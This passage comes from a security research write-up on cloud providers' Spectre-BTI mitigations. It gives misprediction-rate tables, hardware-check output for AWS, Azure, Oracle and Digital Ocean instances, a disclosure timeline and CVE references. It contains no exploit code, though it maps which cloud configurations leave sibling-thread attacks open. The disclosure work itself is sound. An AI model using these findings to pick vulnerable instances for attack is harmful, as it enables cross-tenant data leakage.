| Mitigation  | NOSMT  | SMT  |  Expected?  |
|---|---|---|---|
| No mitigation   | 99.86 %  | 0.09 %   | Yes  |
| IBRS   | 99.79 %  | 0.06 %  | Yes  |
| STIBP  | 99.89 %  | 0.11 %  | Yes  |
| IBPB  | 36.82 %  | 0.05 %  |  No |
| PRCTL  | 99.95 %  | 0.10 %  |  No |

Since the enumeration using CPUID doesn't show support for IBPB, the prctl syscall fails and no mitigations are applied. A similar result can be found for t3 instances.


#### Results for aws-t3a.nano:

EC2 t3a instances use AMD processors, showing that this problem is not exclusive to Intel processors.  In the t3a instances tested it isn't possible to read or write to the MSRs, and prctl also fails with `operation not permitted` error.


```
Kernel is Linux 5.15.0-1026-aws #30-Ubuntu SMP Wed Nov 23 14:15:21 UTC 2022 x86_64
CPU is AMD EPYC 7571

Hardware check
* Hardware support (CPU microcode) for mitigation techniques
  * Indirect Branch Restricted Speculation (IBRS)
    * SPEC_CTRL MSR is available:  NO
    * CPU indicates IBRS capability:  NO 
    * CPU indicates preferring IBRS always-on:  NO 
    * CPU indicates preferring IBRS over retpoline: NO 
  * Indirect Branch Prediction Barrier (IBPB)
    * CPU indicates IBPB capability:  NO 
```


| Mitigation  | NOSMT  | SMT  |  Expected?  |
|---|---|---|---|
| No mitigation   | 76.58 %  | 99.87 %   | Yes  |
| IBRS   | 57.67 %  | 99.87 %  | No  |
| STIBP  | 28.44 %  | 99.92 %  | No  |
| IBPB  | 75.19 %  | 99.84 %  |  No |
| PRCTL  | 73.91 %  | 99.85 %  |  No |



## Tests on Azure

#### Results for azure-d2sv3:

The results for this machine are similar to the t3a instance. It's impossible to read or write from any SPEC_CTRL MSRs and all scenarios are vulnerable, even though it's a Haswell CPU.



#### Results for azure-ubuntu22-F2s-v2:

This machine contains a Xeon(R) Platinum 8272CL (Cascade Lake).  Our tests show that Cascade Lake CPUs are highly resilient against SMT attacks. IBPB can’t be used on this VM, it's not possible to read or write from SPEC_CTRL MSR and prctl fails.  Given the tests show the system is not vulnerable, we conclude that the hardware mitigation is forced-enabled.


```
Checking for vulnerabilities on current system
Kernel is Linux 5.15.0-1029-azure #36-Ubuntu SMP Mon Dec 5 19:31:08 UTC 2022 x86_64
CPU is Intel(R) Xeon(R) Platinum 8272CL CPU @ 2.60GHz

Hardware check
* Hardware support (CPU microcode) for mitigation techniques
  * Indirect Branch Restricted Speculation (IBRS)
    * SPEC_CTRL MSR is available: NO 
    * CPU indicates IBRS capability: NO 
  * Indirect Branch Prediction Barrier (IBPB)
    * CPU indicates IBPB capability: NO 
  * Single Thread Indirect Branch Predictors (STIBP)
    * SPEC_CTRL MSR is available: NO 
    * CPU indicates STIBP capability: NO 
```


| Mitigation  | NOSMT  | SMT  |  Expected?  |
|---|---|---|---|
| No mitigation   | 98.81 %  | 0.01 %   | Yes  |
| IBRS   | 0.00 %  | 0.01 %  | No (1)  |
| STIBP  | 99.94 %  | 0.00 %  | Yes  |
| IBPB  | 99.94 %  | 0.01 %  |  No |
| PRCTL  | 99.90 %  | 0.00 %  |  No |

(1) But not vulnerable, so we assume forced enabled


## Tests on Oracle Cloud

Intel CPUs tested on Oracle Cloud work as expected, but the AMD CPU tested only enumerates the IBPB mitigation, leaving sibling thread attacks exposed. Since the PRCTL can execute IBPB, the syscall succeeds, but it's not enough to protect the process.


```
Kernel is Linux 5.15.0-1021-oracle #27-Ubuntu SMP Fri Oct 14 20:04:26 UTC 2022 x86_64
CPU is AMD EPYC 7551 32-Core Processor

Hardware check
* Hardware support (CPU microcode) for mitigation techniques
  * Indirect Branch Restricted Speculation (IBRS)
    * SPEC_CTRL MSR is available: NO
    * CPU indicates IBRS capability: NO 
    * CPU indicates preferring IBRS always-on: NO 
    * CPU indicates preferring IBRS over retpoline: NO 
  * Indirect Branch Prediction Barrier (IBPB)
    * CPU indicates IBPB capability: YES (IBPB_SUPPORT feature bit)
  * Single Thread Indirect Branch Predictors (STIBP)
    * SPEC_CTRL MSR is available: NO 
    * CPU indicates STIBP capability: NO 
    
Testing victim-PRCTL on core 1: 
PRCTL GET value 0x9
rdmsr: CPU 1 cannot read reg 72
Rate: 1000/1000  MSR[72]=-1
[...]
Rate: 1000/1000  MSR[72]=-1
Total misspredict rate: 9998/10000 (99.98 %)
```



## Tests on Digital Ocean

The tested machines correctly enumerate the CPUs and allow MSR writes.  We did observe a higher than expected hit rate with the IBPB usage.  It is unexpected since, as we’ve stated in the beginning of the report, some hits were supposed to be seen due to the lack of synchronization, but what we saw was closer to 30% (versus <1%).  Given that IBPB does seem to be used, it might be something unrelated to the scope of this research so we’ve decided to report the observation versus investigating it further (notice that we had difficulties identifying the underlying hardware used as well).


```
Kernel is Linux 5.19.0-23-generic #24-Ubuntu SMP PREEMPT_DYNAMIC Fri Oct 14 15:39:57 UTC 2022 x86_64
CPU is DO-Premium-AMD

Hardware check
* Hardware support (CPU microcode) for mitigation techniques
  * Indirect Branch Restricted Speculation (IBRS)
    * SPEC_CTRL MSR is available:  YES 
    * CPU indicates IBRS capability: NO 
    * CPU indicates preferring IBRS always-on: NO 
    * CPU indicates preferring IBRS over retpoline: NO 
  * Indirect Branch Prediction Barrier (IBPB)
    * CPU indicates IBPB capability:  YES (IBPB_SUPPORT feature bit)
  * Single Thread Indirect Branch Predictors (STIBP)
    * SPEC_CTRL MSR is available: YES 
    * CPU indicates STIBP capability: YES (AMD STIBP feature bit)
    * CPU indicates preferring STIBP always-on: NO 
```


| Mitigation  | NOSMT  | SMT  |  Expected?  |
|---|---|---|---|
| No mitigation   | 0.04 %  | 0.41 %   | No  |
| IBRS   | 0.05 %  | 0.38 %  | No  |
| STIBP  | 0.14 % | 0.25 %  | No  |
| IBPB  | 29.39 %  | 18.88 %  |  No |
| PRCTL  | 0.02 %  | 0.02 %  |  No |


## Conclusion

The hardware mitigations for spectre-BTI provide different options for different scenarios.  They also vary in performance impact and scope.  Those mitigations are exposed to the applications via a kernel system call that abstracts some of the complexity (such as deciding if there are sibling threads or not on a system, if and which of the hardware mitigations are available and adequate, etc).  Besides that, another level of abstraction is the hypervisor (which can expose or not the hardware features by filtering the cpuid output, or even control the MSR accesses and the understanding of sibling threads and cores).  Each abstraction (hypervisor, kernel, hardware) has to properly work for the mitigation to be complete.  Unfortunately, while the hardware interface is well documented, the kernel interface changes its default (like using IBRS versus STIBP/IBPB) and the hypervisor is dependent on the configuration (which is controlled by the different cloud providers, that DO NOT share their choices).  That leads to a scenario in which the default configuration might be adequate for bare metal machines, but it is not (for different reasons) in the different cloud setups.

Given our research was not comprehensive (many different stances and offers were not tested) and the test method could be greatly improved, as well as some of the observed results could be more deeply analyzed, we are also sharing the raw data in the hopes to incentivize the community (and the security engineering teams of the companies) to look further.



## Acknowledgements

We would like to thank Alexandra Sandulescu for the excellent feedback, discussions and for reviewing/editing this write-up.



## Timeline

* December 01 2022 - Unexpected behavior on prctl detected
* December 23 2022 - First version of this writeup 
* December 26 2022 - Multiple tests performed on cloud providers
* December 28 2022 - KVM behavior better understood, more cloud provider tests
* December 30 2022 - Final write-up ready to share with vendors



### References:

[^1]: “Branch Target Injection". Link: [https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/advisory-guidance/branch-target-injection.html)


[^2]: “The Linux kernel user-space API guide: Speculation Control”.  Link: [https://docs.kernel.org/userspace-api/spec_ctrl.html](https://docs.kernel.org/userspace-api/spec_ctrl.html) 


[^3]: “Exec ASLR: Abusing Intel Branch Predictors to bypass ASLR”. Link: [https://github.com/es0j/ExecASLR-ekoparty](https://github.com/es0j/ExecASLR-ekoparty)


[^4]: “Reverse Branch Target Buffer Poisoning”.  Link: [https://cos.ufrj.br/uploadfile/publicacao/3061.pdf](https://cos.ufrj.br/uploadfile/publicacao/3061.pdf) 


[^5]: "RET2ASLR - Leaking ASLR from return instructions" Link:

[https://github.com/google/security-research/tree/master/pocs/cpus/ret2aslr](https://github.com/google/security-research/tree/master/pocs/cpus/ret2aslr)


[^6]: "Speculative Execution Side Channel Mitigations" Link:

[https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/technical-documentation/speculative-execution-side-channel-mitigations.html](https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/technical-documentation/speculative-execution-side-channel-mitigations.html)


[^7]: “The Linux kernel user-space API guide: Speculation Control”.  Link:[https://www.kernel.org/doc/html/latest/userspace-api/spec_ctrl.html](https://www.kernel.org/doc/html/latest/userspace-api/spec_ctrl.html)


[^8]: "Spectre Meltdown Checker" Link:

[https://github.com/speed47/spectre-meltdown-checker](https://github.com/speed47/spectre-meltdown-checker)


[^9]: "Intel® 64 and IA-32 Architectures Software Developer’s Manual Volume 4: Model-Specific Registers" Link:

[https://www.intel.com/content/dam/develop/external/us/en/documents/335592-sdm-vol-4.pdf](https://www.intel.com/content/dam/develop/external/us/en/documents/335592-sdm-vol-4.pdf)


[^10]: "Linux Source code" Link:

[https://elixir.bootlin.com/linux/v5.15.65/source/arch/x86/kernel/cpu/bugs.c#L1900](https://elixir.bootlin.com/linux/v5.15.65/source/arch/x86/kernel/cpu/bugs.c#L1900)


[^11]: "Seccomp" Link:

[https://man7.org/linux/man-pages/man2/seccomp.2.html](https://man7.org/linux/man-pages/man2/seccomp.2.html)


[^12]: "Linux Source code" Link:

[https://elixir.bootlin.com/linux/v5.15.65/source/arch/x86/kernel/cpu/bugs.c#L1970](https://elixir.bootlin.com/linux/v5.15.65/source/arch/x86/kernel/cpu/bugs.c#L1970)


[^13]: "AMD64 Architecture Programmer’s Manual Volume 2:" Link:[https://www.amd.com/system/files/TechDocs/24593.pdf](https://www.amd.com/system/files/TechDocs/24593.pdf)


[^14]: “Speculative Execution Side Channel Mitigations”. Link:[https://www.intel.com/content/dam/develop/external/us/en/documents/336996-speculative-execution-side-channel-mitigations.pdf](https://www.intel.com/content/dam/develop/external/us/en/documents/336996-speculative-execution-side-channel-mitigations.pdf)

[^15]: “CVE 2023-0045 Bypassing Spectre-BTI User Space Mitigations”. Link:[https://github.com/google/security-research/security/advisories/GHSA-9x5g-vmxf-4qj8](https://github.com/google/security-research/security/advisories/GHSA-9x5g-vmxf-4qj8)


[^16]: “CVE 2023-1998 Spectre v2 SMT mitigations problem”. Link:[https://github.com/google/security-research/security/advisories/GHSA-mj4w-6495-6crx](https://github.com/google/security-research/security/advisories/GHSA-mj4w-6495-6crx)

